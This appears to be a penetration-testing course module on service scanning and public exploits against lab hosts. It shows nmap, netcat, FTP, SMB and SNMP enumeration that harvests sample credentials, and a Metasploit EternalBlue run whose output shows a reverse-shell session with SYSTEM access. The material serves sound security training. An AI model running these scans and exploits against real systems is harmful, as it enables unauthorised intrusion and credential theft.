# Service Scanning

Let us start with the most basic scan. Suppose that we want to perform a basic scan against a target residing at 10.129.42.253. To do this we should type nmap 10.129.42.253 and hit return. We see that the Nmap scan was completed very quickly. This is because if we don't specify any additional options, Nmap will only scan the 1,000 most common ports by default. The scan output reveals that ports 21, 22, 80, 139, and 445 are available.

```
nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

Under the PORT heading, it also tells us that these are TCP ports. By default, Nmap will conduct a TCP scan unless specifically requested to perform a UDP scan.
The STATE heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as filtered. This can happen if a firewall is only allowing access to the ports from specific addresses.
The SERVICE heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct Nmap to interact with the service and attempt to tease out identifying information, it could be another service altogether.

As we gain familiarity, we will notice that several ports are commonly associated with Windows or Linux. For example, port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine. In our current scenario, port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows. Let us run a more advanced Nmap scan and gather more information about the target device.

We can use the -sC parameter to specify that Nmap scripts should be used to try and obtain more detailed information. The -sV parameter instructs Nmap to perform a version scan. In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version. The version scan is underpinned by a comprehensive database of over 1,000 service signatures. Finally, -p- tells Nmap that we want to scan all 65,535 TCP ports.

`nmap -sV -sC -p- 10.129.42.253`

This returns a lot more information. We see that it took a lot longer to scan 65,535 ports than 1,000 ports. The -sC and -sV options also increase the duration of a scan, as instead of performing a simple TCP handshake, they perform a lot more checks. We notice that this time there is a VERSION heading, which reports the service version and the operating system if this is possible to identify.

So far, we know that the operating system is Ubuntu Linux. Application versions can also help reveal the target OS version. Take OpenSSH, for example. We see the reported version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. From inspection of other Ubuntu SSH package changelogs, we see the release version takes the format 1:7.3p1-1ubuntu0.1. Updating our version to fit this format, we get 1:8.2p1-4ubuntu0.1. A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04.

However, it is worth noting that this cross-referencing technique is not entirely reliable, as it is possible to install more recent application packages on an older OS version. The script scan -sC flag causes Nmap to report the server headers http-server-header page and the page title http-title for any web page hosted on the webserver. The web page title PHP 7.4.3 - phpinfo() indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed. The title (and PHPInfo page) also reveals the PHP version, which is worth noting if it is vulnerable.

Specifying -sC will run many useful default scripts against a target, but there are cases when running a specific script is required. For example, in an assessment scope, we may be asked to audit a large Citrix installation. We could use this Nmap script to audit for the severe Citrix NetScaler vulnerability (CVE-2019–19781), while Nmap also has other scripts to audit a Citrix installation.

```
locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```

The syntax for running an Nmap script is nmap --script <script name> -p<port> <host>.

Nmap scripts are a great way to enhance our scans' functionality, and inspection of the available options will pay dividends. Check out the Network Enumeration with Nmap module for a more detailed study of the Nmap tool.

As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated. Nmap will attempt to grab the banners if the syntax nmap -sV --script=banner <target> is specified. We can also attempt this manually using Netcat. Let us take another example, using the nc version of Netcat:

```
nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```

This reveals that the version of vsFTPd on the server is 3.0.3. We can also automate this process using Nmap's powerful scripting engine: nmap -sV --script=banner -p21 10.10.10.0/24.

It is worth gaining familiarity with FTP, as it is a standard protocol, and this service can often contain interesting data. A Nmap scan of the default port for FTP (21) reveals the vsftpd 3.0.3 installation that we identified previously. Further, it also reports that anonymous authentication is enabled and that a pub directory is available.


```
nmap -sC -sV -p21 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
Nmap scan report for 10.129.42.253
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

Let us connect to the service using the ftp command-line utility.

```
ftp -p 10.129.42.253
Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)

ftp> exit
221 Goodbye.
```

In the above shell, we see that FTP supports common commands such as cd and ls and allows us to download files using the get command. Inspection of the downloaded login.txt reveals credentials that we could use to further our access to the system.

```
cat login.txt 

admin:ftp@dmin123
```

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as EternalBlue. It is crucial to enumerate this sizeable potential attack surface carefully. Nmap has many scripts for enumerating SMB, such as smb-os-discovery.nse, which will interact with the SMB service to extract the reported operating system version.


```
nmap --script smb-os-discovery.nse -p445 10.10.10.40

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds

```

In this case, the host runs a legacy Windows 7 OS, and we could conduct further enumeration to confirm if it is vulnerable to EternalBlue. The Metasploit Framework has several modules for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section. We can run a scan against our target for this module section to gather information from the SMB service. We can ascertain that the host runs a Linux kernel, Samba version 4.6.2, and the hostname is GS-SVCSCAN.

```
nmap -A -p445 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is smbclient. The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.

```
smbclient -N -L \\\\10.129.42.253
```

This reveals the non-default share users. Let us attempt to connect as the guest user.

```
smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

The ls command resulted in an access denied message, indicating that guest access is not permitted. Let us try again using credentials for the user bob (bob:Welcome1).

```
smbclient -U bob \\\\10.129.42.253\\users

Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \bob\> get passwords.txt 
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.


```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

```
snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.

```
onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```

# Public Exploits

Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.
Finding Public Exploits

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with exploit to see if we get any results:

A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

`sudo apt install exploitdb -y`

Then, we can use searchsploit to search for a specific application by its name, as follows:

```
searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                
```

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

    Running reconnaissance scripts to enumerate remote hosts and compromised targets

    Verification scripts to test the existence of a vulnerability without actually compromising the target

    Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

    Many post-exploitation and pivoting tools

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run Metasploit, we can use the msfconsole command:


```
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


set RHOSTS 10.10.10.40

set LHOST tun0
```

Once we have Metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously:

We found one exploit for this service. We can use it by copying the full name of it and using USE to use it:

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the show options command:

Any option with Required set to yes needs to be set for the exploit to work. In this case, we only have two options to set: RHOSTS, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). The second option, LHOST, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, LHOST is being set to the IP associated with our tun0 interface.) We can set them with the set command:

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```
msf6 exploit(windows/smb/ms17_010_psexec) > check
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the Metasploit Framework supports the check function. Finally, we can use the run or exploit command to run the exploit:

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

As we can see, we have been able to gain admin access to the box and used the shell command to drop us into an interactive shell. These are basic examples of using Metasploit to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

```

    Granny/Grandpa
    Jerry
    Blue
    Lame
    Optimum
    Legacy
    Devel
```

-----------------------
The question in this section is:
Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start) 

A quick google search of the plug in finds this page:
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/



